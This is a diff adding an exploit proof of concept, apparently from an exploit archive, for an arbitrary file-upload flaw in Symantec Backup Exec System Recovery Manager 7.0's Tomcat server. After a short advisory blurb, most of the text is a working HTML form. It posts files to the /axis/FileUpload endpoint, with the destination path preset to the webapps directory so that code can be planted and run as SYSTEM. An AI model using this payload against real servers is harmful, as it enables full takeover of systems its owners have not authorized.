@@ -1,0 +1,23 @@
+source: http://www.securityfocus.com/bid/27487/info
+
+Symantec Backup Exec System Recovery Manager is prone to a vulnerability that allows arbitrary unauthorized files to be uploaded to any location on the affected server.
+
+This issue resides in the Symantec LiveState Apache Tomcat server. Attackers can leverage it to execute arbitrary code with SYSTEM-level privileges and completely compromise affected computers. 
+
+<?xml version="1.0"?>
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head><title>File Upload POC</title></head>
+  <body>
+    <h2> Backup Exec System Recovery Manager 7.0<br>File Upload POC</h2>
+    <form action="https://www.example.com:8443/axis/FileUpload" method="post"
+enctype="multipart/form-data">
+      Remote Path: <input name="path" size="100" type="text"
+value="C:\Program Files\Symantec\Backup Exec System
+Recovery\Manager\Services\tomcat\WebApps\axis"/><br/>
+	File to upload: <input name="log_file" type="file"/><br/>
+      <hr/>
+      <p><input type="submit"/><input type="reset"/></p>
+	  </form>
+(c)BastardLabs 2008.
+  </body>
+</html>
